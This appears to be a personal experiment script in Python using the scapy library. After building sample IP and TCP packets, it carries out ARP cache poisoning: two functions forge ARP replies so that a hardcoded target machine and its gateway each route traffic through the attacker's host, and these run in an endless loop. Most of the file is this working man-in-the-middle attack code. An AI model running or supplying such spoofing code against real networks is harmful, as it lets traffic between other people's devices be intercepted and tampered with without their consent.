from scapy.all import *

TARGET_IP = "192.168.2.6"
GATEWAY_IP = "192.168.2.1"

# Playing with an IP packet
a = IP()
a.src = "192.168.2.2"
a.dst = TARGET_IP
print(a)


# Playing with a TCP packet
b = TCP()
print(b)





#####  Playing with an ARP packet. Trying to poison a specified machine  #####
def impersonateTarget():
    # Poison the gateway - make it think that it sends the traffic to the target, but instead send it to us;
    poisonedGateway = ARP()
    poisonedGateway.op = 2
    poisonedGateway.psrc = TARGET_IP
    poisonedGateway.pdst = GATEWAY_IP
    print('Poisoning gateway ' + str(poisonedGateway.pdst))
    send(poisonedGateway, verbose=False)


def impersonateGateway():
    poisonedTarget = ARP()

    # Simulate that this is a response packet (who-has(1) / is-at(2));
    poisonedTarget.op = 2

    # Simulate the IP address the response is coming from. Aim is to make it look like it's coming from the target's gateway.
    # The packet by default will have our mac address as a source. Specify a mac address by setting a poisonedTarget.hwsrc = "30:5a:3a:57:c0:55"
    poisonedTarget.psrc = GATEWAY_IP

    # Victim's IP address that we want to poison;
    poisonedTarget.pdst = TARGET_IP

    print('Poisoning target ' + str(poisonedTarget.pdst))
    send(poisonedTarget, verbose=False)

while True:
    impersonateGateway()
    impersonateTarget()
    time.sleep(2)